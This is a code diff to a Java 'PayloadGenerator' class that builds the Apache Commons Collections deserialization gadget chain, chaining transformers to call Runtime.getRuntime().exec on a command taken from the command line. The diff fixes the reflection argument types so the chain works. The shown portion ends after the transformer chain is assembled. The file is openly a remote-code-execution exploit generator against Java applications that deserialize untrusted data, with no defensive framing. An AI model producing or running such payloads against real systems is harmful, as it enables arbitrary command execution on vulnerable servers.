@@ -1,3 +1,5 @@
+package org.example;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -9,6 +11,7 @@ import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
 import java.util.HashMap;
 import java.util.Map;
+
 /*
 	Gadget chain:
 		ObjectInputStream.readObject()
@@ -34,13 +37,18 @@ import java.util.Map;
 public class PayloadGenerator {
 
     public static void main(String[] args) throws Exception {
-        String command = args[0];
+        String[] command = new String[] { args[0] };
 
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{String.class}, new Object[]{"getRuntime"}),
-                new InvokerTransformer("invoke", new Class[]{Object.class}, new Object[]{null}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        "getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer("exec",
+                        new Class[] { String.class }, command)
         };
 
         Transformer transformerChain = new ChainedTransformer(transformers);
